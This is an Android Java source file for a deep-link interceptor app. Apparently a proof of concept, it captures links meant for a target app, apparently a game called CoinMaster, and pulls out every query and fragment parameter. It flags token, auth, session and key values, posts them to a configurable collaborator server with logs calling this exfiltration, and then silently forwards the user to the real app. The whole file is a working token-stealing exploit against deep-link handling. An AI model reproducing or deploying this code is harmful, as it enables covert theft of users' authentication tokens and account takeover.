package com.example.deeplink;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.IOException;
import java.util.List;
import java.util.Set;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "DeepLinkProxy";
    
    // Configuration loaded from res/values/config.xml
    private String SERVER_URL;
    private String TARGET_PACKAGE;
    private int FORWARD_DELAY_MS;
    private boolean ENABLE_LOCAL_LOGGING;
    private boolean SHOW_DEBUG_TOASTS;
    
    private TextView statusText;
    private Uri capturedUri;
    private DataLogger dataLogger;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Load configuration from config.xml
        loadConfiguration();
        
        statusText = findViewById(R.id.statusText);
        updateStatus("Processing...");
        
        // Initialize persistent logger if enabled
        if (ENABLE_LOCAL_LOGGING) {
            dataLogger = new DataLogger(this);
        }
        
        Intent intent = getIntent();
        Uri data = intent.getData();
        
        if (data != null) {
            capturedUri = data;
            Log.d(TAG, "Intercepted deep link: " + data.toString());
            
            // Extract all parameters
            JSONObject extractedData = extractParameters(data);
            
            // Log locally (backup in case network fails)
            if (ENABLE_LOCAL_LOGGING && dataLogger != null) {
                dataLogger.logCapturedData(extractedData);
                Log.d(TAG, "📝 Data logged to: " + dataLogger.getLogFilePath());
                Log.d(TAG, "📊 Stats: " + dataLogger.getStats().toString());
            }
            
            // Send to collab server
            sendDataToServer(extractedData);
            
            // Wait a moment to ensure data is sent, then forward to real app
            new Handler().postDelayed(() -> forwardToRealApp(data), FORWARD_DELAY_MS);
        } else {
            updateStatus("No deep link detected");
            
            // Show stats even when no deep link
            Log.d(TAG, "📊 Stats: " + dataLogger.getStats().toString());
        }
    }
    
    private JSONObject extractParameters(Uri uri) {
        JSONObject jsonData = new JSONObject();
        
        try {
            // Basic URI components
            jsonData.put("full_uri", uri.toString());
            jsonData.put("scheme", uri.getScheme());
            jsonData.put("host", uri.getHost());
            jsonData.put("path", uri.getPath());
            
            // IMPORTANT: Capture fragment (after #) - tokens might be here!
            String fragment = uri.getFragment();
            if (fragment != null && !fragment.isEmpty()) {
                jsonData.put("fragment", fragment);
                Log.d(TAG, "🔍 FRAGMENT FOUND: " + fragment);
                
                // Parse fragment as query string (common pattern)
                try {
                    JSONObject fragmentParams = parseQueryString(fragment);
                    jsonData.put("fragment_parameters", fragmentParams);
                } catch (Exception e) {
                    Log.w(TAG, "Fragment is not a query string");
                }
            }
            
            // Extract all query parameters
            JSONObject params = new JSONObject();
            Set<String> paramNames = uri.getQueryParameterNames();
            
            for (String paramName : paramNames) {
                String paramValue = uri.getQueryParameter(paramName);
                params.put(paramName, paramValue);
                
                // Log important parameters
                if (paramName.toLowerCase().contains("token") || 
                    paramName.toLowerCase().contains("auth") ||
                    paramName.toLowerCase().contains("session") ||
                    paramName.toLowerCase().contains("key") ||
                    paramName.toLowerCase().contains("code")) {
                    Log.d(TAG, "🔑 SENSITIVE PARAM: " + paramName + " = " + paramValue);
                }
            }
            
            jsonData.put("parameters", params);
            
            // Additional URI details that might contain data
            jsonData.put("authority", uri.getAuthority());
            jsonData.put("encoded_path", uri.getEncodedPath());
            jsonData.put("encoded_query", uri.getEncodedQuery());
            jsonData.put("encoded_fragment", uri.getEncodedFragment());
            jsonData.put("user_info", uri.getUserInfo());
            
            // Device info
            jsonData.put("timestamp", System.currentTimeMillis());
            jsonData.put("device", android.os.Build.MODEL);
            jsonData.put("android_version", android.os.Build.VERSION.RELEASE);
            
            // Log the full URI for debugging
            Log.d(TAG, "📋 FULL URI: " + uri.toString());
            Log.d(TAG, "📋 ENCODED: " + uri.getEncodedQuery());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON", e);
        }
        
        return jsonData;
    }
    
    private JSONObject parseQueryString(String query) throws JSONException {
        JSONObject result = new JSONObject();
        String[] pairs = query.split("&");
        for (String pair : pairs) {
            String[] keyValue = pair.split("=", 2);
            if (keyValue.length == 2) {
                result.put(keyValue[0], keyValue[1]);
                Log.d(TAG, "🔑 Fragment param: " + keyValue[0] + " = " + keyValue[1]);
            }
        }
        return result;
    }
    
    private void sendDataToServer(JSONObject data) {
        // Add network interceptor to log all traffic
        OkHttpClient client = new OkHttpClient.Builder()
                .addInterceptor(new NetworkInterceptor())
                .build();
        
        MediaType mediaType = MediaType.parse("application/json");
        RequestBody body = RequestBody.create(mediaType, data.toString());
        
        Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .addHeader("X-Proxy-Type", "DeepLink-Interceptor")
                .addHeader("X-Capture-Time", String.valueOf(System.currentTimeMillis()))
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                Log.e(TAG, "Failed to exfiltrate data", e);
                runOnUiThread(() -> updateStatus("Redirecting..."));
            }
            
            @Override
            public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "✅ Data successfully exfiltrated to collab");
                    runOnUiThread(() -> updateStatus("Authenticated! Opening app..."));
                } else {
                    Log.e(TAG, "Server response: " + response.code());
                }
                response.close();
            }
        });
    }
    
    private void forwardToRealApp(Uri originalUri) {
        try {
            // Create intent to launch the real app explicitly
            Intent proxyIntent = new Intent(Intent.ACTION_VIEW);
            proxyIntent.setData(originalUri);
            proxyIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            
            // Set the target package (Android will find the correct activity)
            proxyIntent.setPackage(TARGET_PACKAGE);
            
            PackageManager pm = getPackageManager();
            if (proxyIntent.resolveActivity(pm) != null) {
                startActivity(proxyIntent);
                Log.d(TAG, "✅ Forwarded to real app via setPackage: " + TARGET_PACKAGE);
                
                new Handler().postDelayed(() -> finish(), 500);
                return;
            }
            
            // Fallback: Query all apps and find the right one
            proxyIntent.setPackage(null);  // Clear package to query all
            List<ResolveInfo> resolveInfos = pm.queryIntentActivities(proxyIntent, 0);
            
            Log.d(TAG, "Found " + resolveInfos.size() + " apps handling this deep link");
            
            ComponentName realAppComponent = null;
            
            for (ResolveInfo resolveInfo : resolveInfos) {
                String packageName = resolveInfo.activityInfo.packageName;
                String activityName = resolveInfo.activityInfo.name;
                
                Log.d(TAG, "   - " + packageName + "/" + activityName);
                
                // Skip our own package
                if (!packageName.equals(getPackageName())) {
                    // Prefer the target package if found
                    if (packageName.equals(TARGET_PACKAGE)) {
                        realAppComponent = new ComponentName(packageName, activityName);
                        Log.d(TAG, "   ✅ Selected target package");
                        break;
                    }
                    
                    // Otherwise use the first non-self app found
                    if (realAppComponent == null) {
                        realAppComponent = new ComponentName(packageName, activityName);
                        Log.d(TAG, "   ✅ Selected as fallback");
                    }
                }
            }
            
            if (realAppComponent != null) {
                // Forward to real app
                proxyIntent.setComponent(realAppComponent);
                proxyIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(proxyIntent);
                Log.d(TAG, "✅ Forwarded via component: " + realAppComponent.flattenToShortString());
                
                // Close our proxy app after a moment
                new Handler().postDelayed(() -> finish(), 500);
            } else {
                Log.e(TAG, "❌ Real app not found in " + resolveInfos.size() + " candidates");
                runOnUiThread(() -> {
                    updateStatus("App not installed");
                    Toast.makeText(this, "CoinMaster app not found", Toast.LENGTH_LONG).show();
                });
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error forwarding to real app", e);
            runOnUiThread(() -> {
                updateStatus("Error opening app");
                Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            });
        }
    }
    
    /**
     * Load configuration from res/values/config.xml
     */
    private void loadConfiguration() {
        try {
            SERVER_URL = getString(R.string.server_url);
            TARGET_PACKAGE = getString(R.string.target_package);
            FORWARD_DELAY_MS = getResources().getInteger(R.integer.forward_delay_ms);
            ENABLE_LOCAL_LOGGING = getResources().getBoolean(R.bool.enable_local_logging);
            SHOW_DEBUG_TOASTS = getResources().getBoolean(R.bool.show_debug_toasts);
            
            Log.d(TAG, "Configuration loaded:");
            Log.d(TAG, "  Server URL: " + SERVER_URL);
            Log.d(TAG, "  Target Package: " + TARGET_PACKAGE);
            Log.d(TAG, "  Forward Delay: " + FORWARD_DELAY_MS + "ms");
            Log.d(TAG, "  Local Logging: " + ENABLE_LOCAL_LOGGING);
            Log.d(TAG, "  Debug Toasts: " + SHOW_DEBUG_TOASTS);
            
            // Validate configuration
            if (SERVER_URL.contains("YOUR-COLLABORATOR-ID")) {
                Log.e(TAG, "⚠️  WARNING: Please configure server_url in config.xml!");
            }
            if (TARGET_PACKAGE.equals("com.example.targetapp")) {
                Log.e(TAG, "⚠️  WARNING: Please configure target_package in config.xml!");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error loading configuration", e);
            // Set defaults
            SERVER_URL = "https://example.com";
            TARGET_PACKAGE = "com.example.app";
            FORWARD_DELAY_MS = 1000;
            ENABLE_LOCAL_LOGGING = true;
            SHOW_DEBUG_TOASTS = false;
        }
    }
    
    private void updateStatus(String message) {
        if (statusText != null) {
            statusText.setText(message);
        }
    }
}